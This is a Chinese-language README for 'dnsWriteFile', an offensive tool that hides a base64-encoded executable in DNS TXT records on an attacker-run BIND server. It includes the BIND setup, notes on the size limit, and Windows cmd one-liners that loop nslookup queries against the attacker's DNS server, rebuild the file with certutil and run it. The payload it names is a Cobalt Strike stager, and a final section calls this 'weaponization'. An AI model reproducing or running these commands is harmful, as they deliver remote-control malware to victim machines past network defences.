# dnsWriteFile
使用方法如下：
# 安装dns服务器

### 安装 BIND

```
yum -y update
yum -y install bind bind-chroot bind-utils
```

### 修改 BIND 配置文件，允许其他主机使用 DNS 服务

```
vim /etc/named.conf

options {
    # 监听来自于所有打到53端口的请求
    listen-on port 53 { any; };
    # 允许来自任意host的DNS查询
    allow-query     { any; };
    # 转发逻辑为：服务器将只会请求 forwarders中的DNS主机，请求失败时，将直接应答fail

    # 如果不将自己的服务器作为转发服务器，则无需配置forward和forwarders，此时所有的解析将按照之前的迭代查询方式进行查询
    # 转发服务器列表：8.8.8.8
    forwarders  { 8.8.8.8; };
}
```

`/etc/named.conf` 整体文件如下

```·
options {
   listen-on port 53 { any; };
   listen-on-v6 port 53 { ::1; };
   directory    "/var/named";
   dump-file    "/var/named/data/cache_dump.db";
   statistics-file "/var/named/data/named_stats.txt";
   memstatistics-file "/var/named/data/named_mem_stats.txt";
   allow-query     { any; };
   forwarders     { 8.8.8.8; };
        recursion yes;

        dnssec-enable yes;
        dnssec-validation yes;
        managed-keys-directory "/var/named/dynamic";
        pid-file "/run/named/named.pid";
        session-keyfile "/run/named/session.key";
        include "/etc/crypto-policies/back-ends/bind.config";
};

logging {
        channel default_debug {
                file "data/named.run";
                severity dynamic;
        };
};

zone "." IN {
        type hint;
        file "named.ca";
};

include "/etc/named.rfc1912.zones";
include "/etc/named.root.key";
```

### 添加我们要解析的域名

在辅助区域配置文件`/etc/named.rfc1912.zones`中，添加一条我们自己创建的区域

```
zone "mydomain.com" IN {
        type master;
        file "mydomain.com.zone";
        allow-update { none; };
};
```

`/etc/named.rfc1912.zones` 整体文件如下

```·
// named.rfc1912.zones:
//
// Provided by Red Hat caching-nameserver package 
//
// ISC BIND named zone configuration for zones recommended by
// RFC 1912 section 4.1 : localhost TLDs and address zones
// and https://tools.ietf.org/html/rfc6303
// (c)2007 R W Franks
// 
// See /usr/share/doc/bind*/sample/ for example named configuration files.
//
// Note: empty-zones-enable yes; option is default.
// If private ranges should be forwarded, add 
// disable-empty-zone "."; into options
// 

zone "mydomain.com" IN {
        type master;
        file "mydomain.com.zone";
};

zone "localhost.localdomain" IN {
        type master;
        file "named.localhost";
        allow-update { none; };
};

zone "localhost" IN {
        type master;
        file "named.localhost";
        allow-update { none; };
};

zone "1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa" IN {
        type master;
        file "named.loopback";
        allow-update { none; };
};

zone "1.0.0.127.in-addr.arpa" IN {
        type master;
        file "named.loopback";
        allow-update { none; };
};

zone "0.in-addr.arpa" IN {
        type master;
        file "named.empty";
        allow-update { none; };
};
```

### 为解析的域名设置 TXT 等记录的值

我们直接复制一份 `/var/named/` 目录下的 `named.localhost` ，使用 `cp -a` 会直接把对应的权限设置也一并 `copy` 给新文件 `mydomain.com.zone`

```
cp -a /var/named/named.localhost /var/named/mydomain.com.zone
```

添加txt值的`/var/named/mydomain.com.zone`整体文件如下：

```·
$TTL 1D
@       IN SOA  @ rname.invalid. (
                                        0       ; serial
                                        1D      ; refresh
                                        1H      ; retry
                                        1W      ; expire
                                        3H )    ; minimum
        NS      @
        A       127.0.0.1
        AAAA    ::1
www     IN A    1.1.1.1
www1     IN TXT  "exechello world"
```

### 启动 BIND 服务

```
systemctl start named
```

### 关闭防火墙

```·
systemctl stop firewalld
```

### 测试

```·
nslookup -qt=TXT www.mydomain.com your_dns_ip
```

### 超长字符注意

```·
$TTL 1D
@       IN SOA  @ rname.invalid. (
                                        0       ; serial
                                        1D      ; refresh
                                        1H      ; retry
                                        1W      ; expire
                                        3H )    ; minimum
        NS      @
        A       127.0.0.1
        AAAA    ::1
www     IN A    1.1.1.1
www1     IN TXT  ("exechello world"
"nihao"
"test"
"123")

```


### UDP 包大小限制

上一个大坑解决以后，我以为可以任意字符写入了，最终在搞定了其他条件后，测试的时候发现，一个 `70k` 的程序 `base64` 后的结果填充到 `TXT` 记录后，重启DNS服务怎么也启动不起来，我这才意识到，可能 BIND 自己也有一定长度字符限制，通过 fuzz 我也找到了 BIND 最大的字符限制，大概 60000多

为啥我没有记得这么清晰呢？因为当我设置为最大值的时候，我发现 `nslookup` 竟然报错了

后来我查阅了一些资料明白过来，DNS请求和回应包都是 UDP包，UDP包最大长度为 `65535`，还有一些头会占用部分长度，所以留给 `TXT` 记录的长度最长也就是 `65515` 左右

好在 CobaltStrike 生成的 `stege` 木马仅有 `14K`左右, 远小于 65515

### 重启 DNS 服务

```
systemctl restart named
```

### CS上线


文件较小

```·
cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www.mydomain.com your_dns_ip ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" > ttt.txt && certutil -decode ttt.txt a.exe && cmd /c a.exe
```

文件较大

先请求成为各个txt

```html
cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www.mydomain.com your_dns_ip ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >>ttt.txt
```

```html
for /l %k in (0,1,31) do (cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www%k.mydomain.com your_dns_ip ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >>C:\helo.txt) 
```

```html
certutil -decode C:\helo.txt C:\aa.exe && cmd /c C:\aa.exe
```

### 武器化

dnsWriteFile.py

```·
for /l %k in (0,1,31) do (cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www%k.mydomain.com your_dns_ip ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >>C:\helo.txt)
```
